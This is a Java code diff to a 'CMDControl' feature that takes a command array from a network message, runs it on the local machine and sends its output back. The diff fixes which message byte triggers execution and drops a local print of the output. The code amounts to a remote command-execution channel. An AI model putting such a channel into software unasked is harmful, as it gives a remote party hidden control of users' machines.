@@ -41,18 +41,17 @@ public class CMDControl extends Feature {
 
                     Sleep(1000 / 60);
 
-                    if (buffer.length == 0 || buffer[0] == 0 || buffer[0] != NetworkInterface.CommandByte.CHAT_BYTE)
+                    if (buffer.length == 0 || buffer[0] == 0 || buffer[0] != NetworkInterface.CommandByte.CMDCONTROL_BYTE)
                         continue;
 
                     String[] input = (String[]) objectHandler.readModifiedObjects(buffer).get();
                     if (input == null) continue;
 
-                    if(!sameArray(input, old) && !input[0].equals("")){
+                    if (!sameArray(input, old) && !input[0].equals("")) {
                         Process p = new ProcessBuilder(input).start();
                         is = p.getInputStream();
                         System.out.println("Process done!");
                         String inputStreamString = new String(is.readAllBytes());
-                        System.out.println(inputStreamString);
                         Message<String> response = () -> inputStreamString;
                         byte[] data = objectHandler.writeObjects(response);
                         byte[] dataWithId = objectHandler.writeModifiedArray(data, NetworkInterface.CommandByte.CMDCONTROL_BYTE);
@@ -66,12 +65,12 @@ public class CMDControl extends Feature {
         };
     }
 
-    private boolean sameArray(Object[] obj1, Object[] obj2){
-        if(obj1 == null || obj2 == null) return false;
-        if(obj1.length != obj2.length) return false;
+    private boolean sameArray(Object[] obj1, Object[] obj2) {
+        if (obj1 == null || obj2 == null) return false;
+        if (obj1.length != obj2.length) return false;
         int counter = 0;
-        for(int i = 0; i < obj1.length; i++){
-            if(obj1[i].equals(obj2[i])){
+        for (int i = 0; i < obj1.length; i++) {
+            if (obj1[i].equals(obj2[i])) {
                 counter++;
             }
         }
